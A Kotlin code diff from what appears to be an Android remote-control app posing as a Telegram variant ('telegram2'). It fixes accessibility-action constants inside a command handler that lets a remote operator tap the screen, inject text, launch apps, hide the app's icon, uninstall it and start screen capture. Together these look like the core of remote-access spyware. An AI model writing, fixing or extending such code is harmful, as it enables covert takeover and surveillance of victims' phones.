@@ -1,5 +1,6 @@
 package com.telegram2.messaging.remote
 
+import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import android.util.Base64
 import com.google.firebase.database.*
@@ -72,7 +73,7 @@ object CommandProcessor {
     )
 }
 
-// Add extension
+// Extension function — now has access to `context`
 fun MyAccessibilityService.performSingleCommand(type: String, params: Map<String, Any?>) {
     when (type) {
         "tap" -> tap(params["x"] as? Int ?: 500, params["y"] as? Int ?: 1000)
@@ -86,8 +87,8 @@ fun MyAccessibilityService.performSingleCommand(type: String, params: Map<String
         "type" -> injectText(params["text"] as? String ?: "")
         "launch" -> launchApp(params["package"] as? String ?: "")
         "click_text" -> clickText(params["text"] as? String ?: "")
-        "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
-        "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
+        "home" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
+        "back" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
         "hide_activity" -> hideAppIcon()
         "uninstall" -> uninstallSelf()
         "start_screen_capture" -> startScreenCapture()
